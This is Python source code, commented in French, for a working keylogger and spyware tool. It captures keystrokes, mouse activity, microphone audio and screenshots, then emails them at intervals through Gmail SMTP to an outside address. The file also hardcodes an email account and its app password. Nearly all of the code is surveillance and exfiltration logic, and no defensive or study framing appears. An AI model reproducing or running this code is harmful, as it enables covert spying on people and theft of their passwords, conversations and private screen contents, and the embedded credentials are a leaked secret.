import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot as ImageGrab
import sounddevice as sd
from pynput import keyboard, mouse
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Configuration des informations d'adresse e-mail
EMAIL_ADDRESS = "klogger810@gmail.com"
EMAIL_PASSWORD = "ldmj xpqq bahe lhvn"
SEND_REPORT_EVERY = 60  # Intervalle entre les rapports, en secondes

# Classe KeyLogger
class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started...\n"
        self.email = email
        self.password = password
        self.keyboard_listener = None
        self.mouse_listener = None
        self.microphone_thread = None
        self.screenshot_thread = None
        self.running = False

    # Méthode pour ajouter des entrées au log
    def append_log(self, string):
        self.log += string

    # Méthode pour enregistrer les touches frappées
    def on_key_press(self, key):
        try:
            current_key = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = "SPACE"
            elif key == keyboard.Key.esc:
                current_key = "ESC"
            else:
                current_key = f" {key} "
        self.append_log(current_key + "\n")
        print(f"Key pressed: {current_key}")  # Ajout d'un message d'impression
    # Méthode pour enregistrer les mouvements de souris
    def on_mouse_move(self, x, y):
        self.append_log(f"Mouse moved to ({x}, {y})\n")
        print(f"Mouse moved to ({x}, {y})\n")
    
    # Méthode pour enregistrer les clics de souris
    def on_mouse_click(self, x, y, button, pressed):
        action = "Pressed" if pressed else "Released"
        self.append_log(f"Mouse {action} at ({x}, {y}) with {button}\n")
        
    # Méthode pour enregistrer les défilements de souris
    def on_mouse_scroll(self, x, y, dx, dy):
        self.append_log(f"Mouse scrolled at ({x}, {y}) ({dx}, {dy})\n")

    # Méthode pour enregistrer des sons via le microphone
    def microphone(self):
        fs = 44100  # Fréquence d'échantillonnage
        seconds = SEND_REPORT_EVERY  # Durée de l'enregistrement
        try:
            obj = wave.open('sound.wav', 'w')
            obj.setnchannels(1)  # Mode mono
            obj.setsampwidth(2)  # Taille de l'échantillon
            obj.setframerate(fs)  # Fréquence
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            obj.writeframesraw(myrecording)
            obj.close()
            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message="Recording", file="sound.wav")
        except Exception as e:
            self.append_log(f"Error recording microphone: {str(e)}\n")

    # Méthode pour prendre une capture d'écran
    def screenshot(self):
        try:
            img = ImageGrab.grab()
            img.save("screenshot.png")
            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message="Screenshot", file="screenshot.png")
        except Exception as e:
            self.append_log(f"Error taking screenshot: {str(e)}\n")

    # Méthode pour envoyer un email avec le log ou une pièce jointe
    def send_mail(self, email, password, message, file=None):
        sender = EMAIL_ADDRESS
        receiver = "loggerkey285@gmail.com"
        
        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = "Keylogger Report"

        body = f"Keylogger by Boulakhlas Yoan\n\n{message}"
        msg.attach(MIMEText(body, 'plain'))

        if file:
            with open(file, 'rb') as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename= {file}')
            msg.attach(part)
        
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(sender, password)
            text = msg.as_string()
            server.sendmail(sender, receiver, text)
            server.quit()
            print("Email sent successfully")
        except Exception as e:
            self.append_log(f"Failed to send email: {str(e)}\n")

    # Méthode pour démarrer le keylogger
    def start(self):
        self.running = True
        self.keyboard_listener = KeyboardListener(on_press=self.on_key_press)
        self.mouse_listener = MouseListener(on_move=self.on_mouse_move, on_click=self.on_mouse_click, on_scroll=self.on_mouse_scroll)
        self.microphone_thread = threading.Thread(target=self.microphone)
        self.screenshot_thread = threading.Thread(target=self.screenshot)

        self.keyboard_listener.start()
        self.mouse_listener.start()
        self.microphone_thread.start()
        self.screenshot_thread.start()

        self.report()
        print("Keylogger started...")

    # Méthode pour arrêter le keylogger
    def stop(self):
        self.running = False
        if self.keyboard_listener:
            self.keyboard_listener.stop()
            self.keyboard_listener.join()
        if self.mouse_listener:
            self.mouse_listener.stop()
            self.mouse_listener.join()
        if self.microphone_thread:
            self.microphone_thread.join()
        if self.screenshot_thread:
            self.screenshot_thread.join()
        print("Keylogger stopped.")

    # Méthode pour envoyer le rapport périodiquement
    def report(self):
        self.send_mail(self.email, self.password, self.log)
        self.log = ""  # Réinitialiser le log après envoi
        if self.running:
            threading.Timer(self.interval, self.report).start()

# Bloc principal du programme
if __name__ == "__main__":
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.start()

    try:
        threading.Event().wait()  # Attend indéfiniment jusqu'à ce que le programme soit arrêté
    except KeyboardInterrupt:
        keylogger.stop()
        print("Program terminated manually.")
